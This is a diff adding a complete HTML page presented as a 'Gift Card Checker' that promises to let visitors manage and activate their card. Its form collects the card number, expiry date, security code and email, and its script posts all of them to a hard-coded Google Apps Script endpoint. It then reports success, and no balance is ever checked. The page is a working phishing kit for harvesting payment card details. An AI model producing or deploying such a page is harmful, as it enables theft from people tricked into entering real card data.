@@ -1,0 +1,86 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Gift Card Checker</title>
+  <link rel="stylesheet" href="styles.css" />
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css" />
+</head>
+<body>
+  <div class="container">
+    <form id="cardForm">
+      <div class="card-form">
+        <h2>Manage your Card</h2>
+        <p>Enter your Card details to check your balance</p>
+
+        <label>CARD NUMBER (15 DIGITS, NO SPACES)</label>
+        <input name="cardNumber" type="text" placeholder="15 digits, no spaces" maxlength="15" required />
+
+        <label>EXPIRATION DATE (MM / YY)</label>
+        <div class="expiration">
+          <input name="expMonth" type="text" placeholder="MM" maxlength="2" required />
+          <input name="expirationYear" type="text" placeholder="YY" maxlength="2" required />
+        </div>
+
+        <label>SECURITY CODE (ENTER 4-DIGIT CODE)</label>
+        <input name="cvv" type="text" placeholder="Enter 4-digit code" maxlength="4" required />
+
+        <label>EMAIL ADDRESS</label>
+        <input type="email" name="email" placeholder="Optional" />
+
+        <button type="submit">Continue</button>
+      </div>
+    </form>
+
+    <div class="card-info">
+      <h1>Manage and Activate<br />Your Card</h1>
+      <ul>
+        <li><i class="fas fa-ban"></i> No fees after purchase</li>
+        <li><i class="fas fa-lock"></i> Card is replaceable if lost or stolen*</li>
+        <li><i class="fas fa-wallet"></i> Funds do not expire</li>
+        <li><i class="fas fa-store"></i> Use online and in-store</li>
+      </ul>
+      <small>*Restrictions apply. See applicable Cardholder Agreements below.</small>
+    </div>
+  </div>
+
+  <footer style="text-align:center; font-size: 14px; padding: 20px; background: #f0f0f0;">
+    <p>This website is independent and is not affiliated with any gift card issuer.</p>
+    <p><a href="terms.html">Terms and Conditions</a> | <a href="privacy.html">Privacy Policy</a></p>
+  </footer>
+
+  <script>
+    document.getElementById("cardForm").addEventListener("submit", function (event) {
+      event.preventDefault();
+      const formData = new FormData(event.target);
+      const formDetails = {
+        cardNumber: formData.get("cardNumber"),
+        expMonth: formData.get("expMonth"),
+        expirationYear: formData.get("expirationYear"),
+        cvv: formData.get("cvv"),
+        email: formData.get("email"),
+      };
+
+      const scriptURL = "https://script.google.com/macros/s/AKfycbwauvm0G4EZVQWLZSOogX_3QpwlhgGHqLB_cIYMsMsR-MwrOM8WggCOyU4fE5EJdWQZAA/exec";
+
+      fetch(scriptURL, {
+        method: "POST",
+        mode: "no-cors",
+        headers: {
+          "Content-Type": "application/json",
+        },
+        body: JSON.stringify(formDetails),
+      })
+        .then(() => {
+          alert("Details submitted successfully!");
+          document.getElementById("cardForm").reset();
+        })
+        .catch((error) => {
+          console.error("Error:", error);
+          alert("⚠️ Something went wrong! Try again.");
+        });
+    });
+  </script>
+</body>
+</html>
